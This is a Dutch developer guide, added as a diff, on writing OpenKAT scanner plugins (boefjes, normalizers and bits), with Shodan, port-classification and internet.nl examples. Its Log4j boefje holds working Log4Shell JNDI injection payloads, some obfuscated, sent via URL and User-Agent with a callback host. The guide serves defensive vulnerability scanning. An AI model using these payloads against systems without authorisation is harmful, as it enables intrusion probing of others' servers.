@@ -1,0 +1,575 @@
+
+== Plugins voor OpenKAT: boefjes, whiskers en bits
+
+OpenKAT is modulair en kan eenvoudig worden uitgebreid. Deze handleiding geeft een eerste aanzet voor de ontwikkeling van nieuwe plugins. OpenKAT komt met een KATalogus met boefjes, die via de front end van het systeem in te zien zijn. Uitgangspunt is dat alle informatie in de kleinste eenheid wordt verwerkt en opgeslagen, wat het modulaire karakter van OpenKAT waarborgt. 
+
+Deze handleiding legt uit hoe de plugins werken en hoe ze worden gemaakt, en geeft een overzicht van welke plugins er al zijn. De handleiding gaat uit van OpenKAT 1.3.0, aangezien de boefjes en normalizers hierin worden vereenvoudigd. 
+
+Deze handleiding overlapt deels met de functionele documentatie, die hier te vinden is: 
+
+link:functioneel[Functionele documentatie]
+
+=== Welke soorten plugins zijn er?
+
+Er zijn drie soorten, die door OpenKAT worden ingezet om informatie te verzamelen, in objecten voor het datamodel te vertalen en vervolgens te analysen. Boefjes verzamelen feiten, Whiskers structureren de informatie voor het datamodel en Bits bepalen wat je ervan wilt vinden; het zijn de businessrules. Elke actie wordt in zo klein mogelijke stukken geknipt. 
+
+* Boefjes:
+** verzamelen feitelijke informatie, bijvoorbeeld door het aanroepen van een externe scantool als nmap of door een database zoals shodan te gebruiken. 
+** link:https://github.com/minvws/nl-kat-boefjes/tree/main/boefjes[Overzicht boefjes]
+* Whiskers: 
+** analyseren de informatie en maken er objecten van voor het datamodel in Octopoes
+** zijn opgenomen in de boefjes
+* Bits:
+** bevatten de businessrules die de analyse doen op de objecten. 
+** link:https://github.com/minvws/nl-kat-octopoes/tree/main/bits[Overzicht bits]
+
+Boefjes en Whiskers zijn aan elkaar gekoppeld. De informatie die een boefje oplevert wordt naar een of meerdere whiskers gestuurd om de objecten eruit te halen. De Bits zijn gekoppeld aan objecten en beoordelen als het ware 'vanaf de andere kant' het datamodel. 
+
+=== Hoe werken ze samen? 
+
+Een hostname die als object aan OpenKAT wordt gegeven, wordt door de bijpassende boefjes als input voor een zoekactie gebruikt. De hostname past in het datamodel, en de boefjes worden ingezet om de met de hostname samenhangende objecten uit het datamodel op te zoeken. In de praktijk leidt dit tot een scan van alle bijbehorende systemen, zodat een beeld ontstaat van het netwerk waar de hostname naartoe wijst. Dit beeld bestaat als objecten in het datamodel in Octopoes. 
+
+De scan wordt gedaan door de boefjes, alle informatie wordt door whiskers genormaliseerd en in objecten omgezet. Deze objecten leiden weer tot de inzet van nieuwe boefjes, die op zoek gaan naar aanpalende objecten in het datamodel. Zo is OpenKAT een soort sneeuwbal die aan de hand van het datamodel door het netwerk rolt. De logische verbanden tussen objecten wijzen de weg en OpenKAT zoekt steeds nieuwe boefjes uit tot het model compleet is. 
+
+De nieuwe objecten in het datamodel worden beoordeeld door Bits, de businessrules. Dit levert bevindingen op, die als objecten worden toegevoegd. Zo hoort bij de hostname een dns configuratie, die aan bepaalde eisen moet voldoen. Er is bijvoorbeeld wel of niet sprake van DNSSEC of er zijn bepaalde configuratiefouten gemaakt. De Bits die hierover gaan voegen de bevindingen toe als objecten in Octopoes. 
+
+=== Waar beginnen? 
+
+De eerste vraag is: 'welke kwetsbaarheid wil ik aanwijzen en welke informatie heb ik daarvoor nodig?'. Als je dit weet zijn er een aantal opties: 
+
+. de informatie is al aanwezig in het datamodel -> maak een businessrule (bit)
+. de informatie is aanwezig in de output van een bestaand boefje -> maak een normalizer (whiskers) 
+. de informatie is nog niet beschikbaar -> maak een boefje, pas het datamodel aan en maak een normalizer
+
+Er zijn een paar uitgangspunten: 
+
+. Wil je feitelijke informatie toevoegen, gebruik een Boefje. 
+. Wil je een mening of analyse toevoegen, gebruik een Bit
+
+OpenKAT gaat er vanuit dat je alle informatie in zo klein mogelijke eenheden verzamelt en verwerkt, zodat deze ook weer kunnen bijdragen aan andere combinaties en resultaten. Zo behoud je het modulaire karakter van het pakket. 
+
+Om een bevinding te maken over een CVE bij een software versie heb je een string aan objecten: het aantreffen van de software, de versie, de CVE. Die combinatie leidt dan tot het object van de bevinding. 
+
+=== Hoe werken Boefjes? 
+
+Een Boefje is een plugin voor OpenKAT die informatie ophaalt door een externe tool aan te roepen of zelf informatie op te vragen. Hierdoor zijn boefjes eenvoudig en licht, zelf te programmeren en aanpasbaar. Als je weet in waar de informatie zit die je wilt ophalen is het eenvoudig hier een boefje voor te schrijven.  Een boefje bestaat uit een aantal bestanden, waarin de verschillende onderdelen zijn opgenomen. 
+
+==== Bestaande boefjes
+
+De bestaande boefjes zijn te bekijken via de KAT-alogus in OpenKAT, maar kunnen ook op github gevonden worden op:
+
+link:https://github.com/minvws/nl-kat-boefjes/tree/main/boefjes[Overzicht boefjes]
+
+==== Voorbeeld: het boefje voor shodan
+
+Het boefje dat shodan aanroept geeft een goede eerste indruk van de mogelijkheden. Het boefje omvat de volgende bestanden. 
+
+* __init.py__, dat leeg blijft, 
+* boefje.json, met de normalizers en de objecten in het datamodel,
+* cover.jpg, met een bijpassende kattenfoto ten behoeve van de KAT-alogus
+* description.md, eenvoudige documentatie van het boefje
+* main.py, het eigenlijke boefje
+* normalize.py, de normalizer (whiskers)
+* normalizer.json, wat accepteert en levert de normalizer
+* requirements.txt, met de benodigdheden voor dit boefje
+* schema.json, settings voor de webinterface
+
+===== boefje.json 
+
+boefje.json is de definitie van het boefje, met de positie in het datamodel, de bijbehorende normzalizer, de objecten en de bevindingen die de combinatie van boefje en normalizer kan aanleveren. 
+
+De objecten die bij dit boefje horen zijn IPAddressV4, IPAddressV6, Finding, CVEFindingType. Dit boefje consumeert IP-adressen en produceert findings over de open poorten, aangevuld met de informatie over deze poorten.
+
+Bij Shodan hoort een API key, die je in de webinterface kunt toevoegen. 
+
+....
+
+    {
+        "id": "shodan",
+        "name": "Shodan",
+        "description": "Use Shodan to find open ports with vulnerabilities that are found on that port",
+        "consumes": [
+            "IPAddressV4",
+            "IPAddressV6"
+        ],
+        "produces": [
+            "Finding",
+            "IPPort",
+            "CVEFindingType"
+        ],
+        "environment_keys": ["SHODAN_API"],
+        "scan_level": 1
+    }
+....
+
+
+Met de template als basis kun je zelf een boefje.json aanmaken voor je eigen boefje. De template begint met de naam van je nieuwe boefje: 
+
+....
+
+#replace with your own boefje information
+    {
+        "id": "boefje",
+        "name": "Boefje",
+        "description": "Beschrijving",
+
+....
+
+Je boefje verzamelt informatie om er objecten van te maken. Geef de objecten aan die je boefje nodig heeft. Die objecten komen uit het datamodel. Mocht de informatie die je wilt ophalen nog niet in het datamodel zijn verwerkt moet je dit apart aanpassen. Verderop in dit document is in grote lijnen beschreven hoe dit werkt. 
+
+....
+        "consumes": [
+            "object uit het datamodel",
+            "nog een object uit het datamodel"
+        ],
+        "produces": [
+            "informatie",
+            "informatie"
+        ],
+....
+
+Het boefje kan ook variabelen meenemen uit de webinterface, zoals bij Shodan de API key. Er zijn meer mogelijkheden, je kunt hier creatief mee zijn en de eindgebruiker settings laten meegeven vanuit de webinterface. 
+
+....
+        "environment_keys": ["SHODAN_API"],
+        "scan_level": 1
+....
+
+===== schema.json
+
+Om de gebruiker informatie te laten toevoegen via de webinterface voeg je het bestand schema.json toe aan de map waar je boefje staat. Deze json wordt gebruikt als basis voor een formulier voor de gebruiker. In dit geval kan deze er een API key in kwijt, maar het kan ook iets anders zijn waar je boefje op reageert. Dit Schema moet voldoen aan de https://json-schema.org/ standaard. Momenteel begrijpt OpenKAT echter alleen vrij ondiepe structuren. Zo worden niet alle veldtypes ondersteund, en begrijpt OpenKAT ook geen referenties. Of jouw Schema netjes wordt begrepen kun je testen door het settings-formulier in Rocky's KAT-alogus te bekijken voor jouw boefje.
+
+....
+
+{
+  "title": "Arguments",
+  "type": "object",
+  "properties": {
+    "SHODAN_API": {
+      "title": "SHODAN_API",
+      "maxLength": 128,
+      "type": "string",
+      "description": "A Shodan API key (see https://developer.shodan.io/api/requirements)."
+    }
+  },
+  "required": [
+    "SHODAN_API"
+  ]
+}
+....
+
+===== main.py 
+
+Het boefje importeert zelf de shodan api module, geeft daar een IP adres aan en accepteert de output. Deze output gaat naar Bytes en wordt door een (of meer) normalizers geanalyseerd. 
+
+....
+import json
+from typing import Tuple, Union
+
+import shodan
+
+from os import getenv
+from boefjes.job_models import BoefjeMeta
+
+
+def run(boefje_meta: BoefjeMeta) -> Tuple[BoefjeMeta, Union[bytes, str]]:
+
+    api = shodan.Shodan(getenv("SHODAN_API"))
+    input_ = boefje_meta.arguments["input"]
+    ip = input_["address"]
+    results = api.host(ip)
+
+    return boefje_meta, json.dumps(results)
+....
+
+In de template is dit als volgt weergegeven: 
+
+....
+import json
+from typing import Tuple, Union
+from job import BoefjeMeta
+
+
+def run(boefje_meta: BoefjeMeta) -> Tuple[BoefjeMeta, Union[bytes, str]]:
+    """
+    Here you can place the code of your boefje.
+    First step would be to extract the relevant information from the input OOI.
+    For example, if the input OOI is a Hostname, you would want to extract the name of that hostname with:
+    name = input_["name"].
+
+    Then you can scan with that information. At the end, make sure this method returns a Tuple of BoefjeMeta and bytes or str.
+    """
+    input_ = boefje_meta.arguments["input"]
+
+    #Place you code here
+
+    return boefje_meta, json.dumps(results)
+....
+
+=== Hoe vertaal ik deze informatie in objecten: normalizers
+
+Een boefje haalt informatie op en geeft die aan een of meerdere normalizers, genaamd Whiskers. De normalizer importeert de informatie uit Bytes, vertaalt het in objecten en geeft ze aan Octopoes. Sinds OpenKAT 1.3.0 zijn de normalizers volledig zelfstandig. Ze bestaan uit de volgende bestanden: 
+
+* __init__.py
+* normalize.py
+* normalizer.json
+
+==== normalizer.json
+
+De normalizers vertalen de output van een boefje naar objecten die in het datamodel passen. Per normalizer wordt gedefinieerd welke input ze accepteren en wat ze leveren. In het geval van de shodan normalizer gaat het om de gehele output van het shodan boefje (gemaakt op basis van IP adres), waar bevindingen en poorten uitkomen. De normalizer.json definieert deze:
+
+....
+{
+    "id": "kat_shodan_normalize",
+    "consumes": [
+        "shodan"
+    ],
+    "produces": [
+        "Finding",
+        "IPPort",
+        "CVEFindingType"
+    ]
+}
+....
+
+==== normalize.py
+
+Het bestand normalize.py bevat de eigenlijke normalizer. 
+
+....
+import json
+from typing import Iterator, Union
+
+from octopoes.models import OOI, Reference
+from octopoes.models.ooi.findings import CVEFindingType, Finding
+from octopoes.models.ooi.network import IPPort, Protocol, PortState
+
+from boefjes.job_models import NormalizerMeta
+
+
+def run(normalizer_meta: NormalizerMeta, raw: Union[bytes, str]) -> Iterator[OOI]:
+    results = json.loads(raw)
+    ooi = Reference.from_str(normalizer_meta.boefje_meta.input_ooi)
+
+    for scan in results["data"]:
+        port_nr = scan["port"]
+        transport = scan["transport"]
+
+        ip_port = IPPort(
+            address=ooi,
+            protocol=Protocol(transport),
+            port=int(port_nr),
+            state=PortState("open"),
+        )
+        yield ip_port
+
+        if "vulns" in scan:
+            for cve, _ in scan["vulns"].items():
+                ft = CVEFindingType(id=cve)
+                f = Finding(finding_type=ft.reference, ooi=ip_port.reference)
+                yield ft
+                yield f
+....
+
+
+=== Boefjes maken: Wat moet ik vooraf weten? 
+
+Met de voorbeelden kun je aan de slag. Als je zelf een boefje wilt maken stel je jezelf dan de volgende vragen: 
+
+* Welke objecten wil ik vinden, waar staan ze in het datamodel?
+* Welke tool is hiervoor geschikt en hoe spreek ik die aan?
+* Welke output krijg ik en hoe vertaal ik die in een object?
+
+Wil je een object toevoegen dan moet je weten met welke andere objecten er een logische relatie is. Een object is zo eenvoudig mogelijk. Daardoor explodeert een schijnbaar eenvoudige vraag soms in een hele boom aan onderdelen. 
+
+==== Objecten toevoegen aan het datamodel
+
+Objecten toevoegen aan het datamodel vraagt om een aanvulling in octopoes. Hier kan een object worden toegevoegd als het in verbinding staat met andere objecten. Visueel is dit goed te begrijpen met behulp van de link:https://mispo.es/model-explorer/model-explorer.html[Graph explorer]. 
+
+De eigenlijke code staat hier: 
+
+https://github.com/minvws/nl-kat-octopoes/tree/main/octopoes/models/ooi 
+
+Zoals bij het boefje voor shodan gebruiken we hier weer het voorbeeld uit de functionele documentatie. Een omschrijving van een object in het datamodel, in dit geval een IPPort, ziet er als volgt uit: 
+
+....
+class IPPort(OOI):
+    object_type: Literal["IPPort"] = "IPPort"
+
+    address: Reference = ReferenceField(IPAddress, max_issue_scan_level=0, max_inherit_scan_level=4)
+    protocol: Protocol
+    port: conint(gt=0, lt=2 ** 16)
+    state: Optional[PortState]
+
+    _natural_key_attrs = ["address", "protocol", "port"]
+    _reverse_relation_names = {"address": "ports"}
+    _information_value = ["protocol", "port"]
+....
+
+Hier is gedefinieerd dat bij een IPPort een IPadress hoort, een Protocol en een PortState. Ook is er aangegeven hoe de scan levels door dit object voortvloeien en zijn de attributen die de primary/natural key opmaken aangegeven: "_natural_key_attrs = ["address", "protocol", "port"]". Over scan levels / vrijwaringen volgt verderop in dit document meer uitleg. 
+
+De PortState die wordt aangeroepen is apart gedefinieerd. Dit kan bij informatie die een heel specifiek karakter heeft zodat je dit kunt omschrijven. 
+
+....
+class PortState(Enum):
+    OPEN = "open"
+    CLOSED = "closed"
+    FILTERED = "filtered"
+    UNFILTERED = "unfiltered"
+    OPEN_FILTERED = "open|filtered"
+    CLOSED_FILTERED = "closed|filtered"
+....
+
+==== Voorbeeld: Contractuele aspecten van de hostname
+
+Als je OpenKAT wilt gebruiken om niet alleen technische maar ook contractuele risicos in kaart te brengen biedt het framework er de ruimte voor. Of een systeem nu gehackt wordt of dat je domeinregistratie verloopt maakt voor de gebruiker weinig uit: die kan er niet bij. 
+Op dit moment zijn contracten nog geen onderdeel van het datamodel, al is dat wel een wens want het is relevant. Daarom hier een gedachtenexperiment, om je mee te nemen in het uitbreiden van OpenKAT ten behoeve van je eigen organisatie. 
+
+Laten we beginnen bij het voorbeeld van de hostname. Hierbij hoort een domeinnaam met een overeenkomst met een registrar, met een contractpartij, contactgegevens, contractvoorwaarden, een start- en einddatum, betalingsvorm en betalingstermijn. De betaling is weer gekoppeld aan een bankrekening en aan overschrijvingen, die via de financiele administratie te benaderen zijn. 
+
+Om dit in OpenKAT te realiseren moet de informatie in de organisatie worden gevonden, in objecten worden verdeeld en moeten er bij alle objecten passende businessrules worden geschreven. Zo is het contract met de registrar vrij eenvoudig. Het heeft zeker de volgende objecten: 
+
+* Hostname
+* Startdatum
+* Einddatum
+* Kosten per periode
+* Registrar
+* Contactgegevens (uitgesplitst)
+* Bankgegevens
+* KvK nummer
+* BTW nummer
+
+Deze objecten kunnen worden opgenomen, maar geven buiten de einddatum nog geen informatie over het administratieve risico van wanbetaling door de eigen organisatie. Hiervoor moeten ook de facturen worden betrokken. De registrar stuurt immers facturen voor de geleverde dienst en die moeten worden voldaan. Als nu een factuur binnenkomt kan deze door een boefje worden opgehaald, door een normalizer geanalyseerd en toegevoegd aan het systeem. 
+
+Hier horen zeker de volgende objecten bij, aanvullend aan de gegevens uit het contract: 
+
+* Factuurnummer
+* Factuurdatum
+* Bedrag
+* Betaaltermijn
+
+Om te weten of een factuur voldaan is moet worden gekeken naar de financiele administratie. Ook hier kan een boefje voor gemaakt worden. Er komen maar enkele nieuwe objecten bij, want alle andere gegevens hadden we al uit de eerdere stappen. 
+
+* Bank
+* Eigen bankrekening
+* Type overmaking
+* Overschrijvingsdatum
+
+De bank, bankrekening en type overmaking zijn te specificeren uit een lijst, zoals de IPports in het voorbeeld hierboven. Het is mogelijk om via een businessrule bij een binnenkomende factuur van een vaste contractpartner een bevinding aan te maken voor wijzigingen in bijvoorbeeld de bankrekening of in het bedrag. Zolang alle objecten logisch met elkaar verbonden zijn is het te gebruiken voor analyse van de gegevens. 
+
+==== Welke tool gebruik ik hiervoor? 
+
+In het voorbeeld hierboven is het ophalen van de contracten uit de contractadministratie en de facturen uit de financiele administratiesterk afhankelijk van de inrichting daarvan. Wordt binnenkomende post automatisch met OCR in een systeem opgenomen of ingevoerd, staat het een mapje op een netwerkschijf of is hier kantoorautomatisering voor ingericht?  
+
+Boefjes kunnen ook in python geprogrammeerd worden om basale taken uit te voeren, hiervoor is niet per se een externe tool nodig. Een boefje dat gebruik maakt van deze mogelijkheid is het boefje dat op LOG4J scant en een eenvoudige scan uitvoert conform de CVE. Op een vergelijkbare manier kan ook kantoorautomatisering worden aangesproken, als deze niet van zichzelf al over een API beschikt. Het voorbeeld van LOG4J staat hieronder en geeft een beeld van de mogelijkheden die binnen OpenKAT bestaan: 
+
+....
+import json
+import logging
+from base64 import b64encode
+from typing import Tuple, Union, Optional, Dict
+from urllib.parse import urlparse
+
+import requests
+import urllib3
+
+from boefjes.job_models import BoefjeMeta
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+logging.basicConfig(level=logging.INFO)
+
+TIMEOUT = 15
+REPLY_FQDN = "cve.stillekat.nl"
+
+
+def run(boefje_meta: BoefjeMeta) -> Tuple[BoefjeMeta, Union[bytes, str]]:
+    input_ = boefje_meta.arguments["input"]
+    host = input_["name"]
+
+    identifier = boefje_meta.id
+
+    schemes = ["http", "https"]
+
+    output = {}
+    for scheme in schemes:
+        url = f"{scheme}://{host}/"
+        payloads = get_payloads(url, REPLY_FQDN, identifier)
+
+        checks = [check(url, payload, TIMEOUT) for payload in payloads.values()]
+        header_checks = [check_with_header(url, "User-Agent", payload, TIMEOUT) for payload in payloads.values()]
+
+        output[scheme] = {
+            "checks": dict(zip(payloads.keys(), checks)),
+            "header_checks": dict(zip(payloads.keys(), header_checks)),
+        }
+
+    return boefje_meta, json.dumps(output).encode()
+
+
+def check_with_header(url_input: str, header_name: str, payload: str, timeout: int) -> Optional[str]:
+
+    try:
+        response = requests.get(url_input, headers={header_name: payload}, verify=False, timeout=timeout)
+
+        return b64encode(response.content).decode()
+    except requests.exceptions.ConnectionError as e:
+        logging.error(f"HTTP connection to {url_input} URL error: {e}")
+
+
+def check(url_input: str, payload: str, timeout: int) -> Optional[str]:
+    try:
+        response = requests.get(f"{url_input}{payload}", verify=False, timeout=timeout)
+
+        return b64encode(response.content).decode()
+    except requests.exceptions.ConnectionError as e:
+        logging.error(f"HTTP connection to {url_input} URL error: {e}")
+
+
+def get_payloads(url_input: str, reply_host: str, identifier: str) -> Dict[str, str]:
+    payloads = [
+        "${{jndi:ldap://{}/test.class}}",
+        "${{jndi:dns://{}:53/test.class}}",
+        "${{jndi:rmi://{}:1099/test.class}}",
+        "${{${{::-j}}ndi:rmi://{}/test.class}}",
+        "${{${{::-j}}${{::-n}}di:rmi://{}/test.class}}",
+        "${{${{::-j}}${{::-n}}${{::-d}}i:rmi://{}/test.class}}",
+        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:rmi://{}/test.class}}",
+        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}mi://{}/test.class}}",
+        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}i://{}/test.class}}",
+        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}://{}/test.class}}",
+    ]
+
+    url_parsed = urlparse(url_input)
+    combined = f"{identifier}.{url_parsed.hostname}.{reply_host}"
+    filled_payloads = [payload.format(combined) for payload in payloads]
+
+    return dict(zip(payloads, filled_payloads))
+
+....
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+===== Bits: businessrules om objecten te beoordelen
+
+De Bits zijn businessrules die objecten beoordelen. Welke poorten mogen openstaan, welke niet, welke softwareversie is acceptabel, welke niet. Voldoet een systeem als geheel aan een set eisen die hoort bij een bepaalde certificering of niet? 
+
+De gedachtenoefening hierboven met de contracten bij een domeinnaam levert ook een aantal nieuwe Bits op, die interessant zijn om het concept uit te leggen. Als je naar het contractuele risico van een domeinregistratie kijkt komen bijvoorbeeld de volgende items naar voren, die een businessrule zouden kunnen zijn: 
+
+* registrar moet overeenkomen met de registrars op een bepaalde lijst
+* als datum einde contract binnen minder dan 2 maanden is, maak een bevinding
+* als een factuur beschikbaar is maar nog niet betaald, maak een bevinding (niet critical)
+* als een factuur na de betaaltermijn nog niet is betaald, maak een bevinding (critical)
+* als de bankrekening op de factuur niet overeenkomt met die op het contract, maak een bevinding (critical)
+
+In OpenKAT zijn de contracten nog niet, maar de technische aspecten wel geimplementeerd. In het voorbeeld van de hostname levert die een IP adres op, en op basis van het IP adres wordt gekeken welke poorten open zijn. Daar zijn een aantal poorten bij die open horen te zijn omdat er bepaalde software draait en poorten die dicht horen te zijn omdat ze vanuit veiligheids- of configuratieoogpunt niet gebruikt worden. 
+
+Het voorbeeld hieronder komt uit de functionele documentatie en gaat in op de Bit voor het object IPPort. De bit die voor de analyse van openstaande poorten gebruikt wordt bestaat uit drie bestanden: 
+
+* __init.py__, een leeg bestand
+* bit.py, dat de structuur definieert
+* port_classification.py, dat de businessrules bevat
+
+Bit.py geeft de structuur van de bit, met de input en de businessrules waartegen wordt getoetst. Een voorbeeld is hieronder opgenomen. De bit accepteert input die hoort bij de objecten IPPort en IPAddress. Vervolgens wordt de module port_classification aangeroepen, waar de businessrules in staan.
+
+....
+from bits.definitions import BitParameterDefinition, BitDefinition
+from octopoes.models.ooi.network import IPPort, IPAddress
+
+BIT = BitDefinition(
+    id="port-classification",
+    consumes=IPPort,
+    parameters=[],
+    module="bits.port_classification.port_classification",
+)
+....
+
+De businessrules zijn opgenomen in de module port_classification, in het bestand port_classification.py. Deze bit pakt het object IPPort en levert de objecten KATFindingType en Finding. De businessrules onderscheiden in dit geval drie typen poorten: de COMMON_TCP_PORTS die open mogen staan, SA_PORTS die voor beheersdoeleinden zijn en dicht horen te staan en DB_PORTS die op de aanwezigheid van bepaalde databases wijzen en dicht horen te staan. 
+
+De specificatie voor een bit is ruim, maar beperkt door het datamodel. Boefjes halen extern informatie op, bits kijken alleen naar de objecten in Octopoes. Aan de hand van de analyse van de informatie kunnen vervolgens nieuwe objecten worden aangemaakt, zoals de KATFindingTypes die weer corresponderen met een reeks aan specifieke meldingen in OpenKAT. 
+
+....
+from typing import List, Iterator
+
+from octopoes.models import OOI
+from octopoes.models.ooi.findings import KATFindingType, Finding
+from octopoes.models.ooi.network import IPPort
+
+COMMON_TCP_PORTS = [25, 53, 110, 143, 993, 995, 80, 443]
+SA_PORTS = [21, 22, 23, 3389, 5900]
+DB_PORTS = [1433, 1434, 3050, 3306, 5432]
+
+
+def run(
+    input_ooi: IPPort,
+    additional_oois: List,
+) -> Iterator[OOI]:
+
+    port = input_ooi.port
+    if port in SA_PORTS:
+        open_sa_port = KATFindingType(id="KAT-560")
+        yield open_sa_port
+        yield Finding(
+            finding_type=open_sa_port.reference,
+            ooi=input_ooi.reference,
+            description=f"Port {port} is a system administrator port and should not be open.",
+        )
+
+    if port in DB_PORTS:
+        ft = KATFindingType(id="KAT-561")
+        yield ft
+        yield Finding(
+            finding_type=ft.reference,
+            ooi=input_ooi.reference,
+            description=f"Port {port} is a database port and should not be open.",
+        )
+
+    if port not in COMMON_TCP_PORTS and port not in SA_PORTS and port not in DB_PORTS:
+        kat = KATFindingType(id="KAT-562")
+        yield kat
+        yield Finding(
+            finding_type=kat.reference,
+            ooi=input_ooi.reference,
+            description=f"Port {port} is not a common port and should possibly not be open.",
+        )
+....
+
+Bits kunnen patronen herkennen en daaruit objecten afleiden. De Bit voor internet.nl kan zo uit een serie objecten afleiden of een bepaalde site aan de eisen van internet.nl voldoet of niet. Deze bit haalt uit een reeks items de findings op en trekt op basis daarvan conclusies. De analyse die hieraan ten grondslag ligt wordt opgebouwd uit kleine stappen, die in OpenKAT een aantal keer rondgaan voordat er genoeg informatie beschikbaar is om de juiste conclusies te trekken. 
+
+....
+from bits.definitions import BitParameterDefinition, BitDefinition
+from octopoes.models.ooi.dns.zone import Hostname
+from octopoes.models.ooi.findings import Finding
+from octopoes.models.ooi.web import Website
+
+BIT = BitDefinition(
+    id="internet-nl",
+    consumes=Hostname,
+    parameters=[
+        BitParameterDefinition(ooi_type=Finding, relation_path="ooi"),  # findings on hostnames
+        BitParameterDefinition(ooi_type=Finding, relation_path="ooi.website.hostname"),  # findings on resources
+        BitParameterDefinition(ooi_type=Finding, relation_path="ooi.resource.website.hostname"),  # findings on headers
+        BitParameterDefinition(ooi_type=Finding, relation_path="ooi.hostname"),  # findings on websites
+        BitParameterDefinition(ooi_type=Finding, relation_path="ooi.netloc"),  # findings on weburls
+        BitParameterDefinition(ooi_type=Website, relation_path="hostname"),  # only websites have to comply
+    ],
+    module="bits.internetnl.internetnl",
+)
+....
+
+
+
+
+
